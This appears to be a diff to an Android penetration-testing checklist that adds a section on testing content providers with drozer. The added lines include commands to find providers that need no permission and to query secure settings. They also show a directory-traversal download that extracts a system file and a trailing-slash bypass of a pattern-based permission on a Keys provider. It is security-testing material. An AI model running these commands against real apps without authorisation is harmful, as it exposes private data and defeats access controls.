@@ -877,12 +877,53 @@ Check if Code can be decompiled
 Check if There is any API Key or Sensitive iformation in Source Code
 ```
 
-### Leaking Content Providers
+
+
+### Testing for  Vulnerable Content Providers
 ```
 Check if content providers are accessable to other apps
 Find contrent Providers
-grep -iRn /soruceCode/
+grep -iRn /soruceCode/ "content://"
 adb shell content query --url content://asdasdasdasdasdasd
+
+
+
+
+Fiding Vulnerable Content Providers:
+------------------------------------
+dz> run app.provider.finduri –-permission null
+
+
+
+Finding Content Providers of Paticular Package
+----------------------------------------------
+dz> run app.provider.finduri [package]
+
+
+
+
+Querying the content Provider
+-----------------------------
+dz> run app.provider.query content://settings/secure
+
+
+
+
+
+Checking Directory traversal
+-----------------------------
+dz> run app.provider.download content://vulnerabledatabase/../../../
+system/etc/hosts /tmp/hostsFileExtracted.txt
+
+
+
+Checking PATTERN_LITERAL Permission
+------------------------------------
+if the content provider is content://com.mwr.example.siever. DBContentProvider/Keys which has access denied. We can append extra / to the content provider to bypass the pattern based Protection.
+
+
+dz> run app.provider.query content://com.mwr.example.siever.
+DBContentProvider/Keys/
 
 ```
 
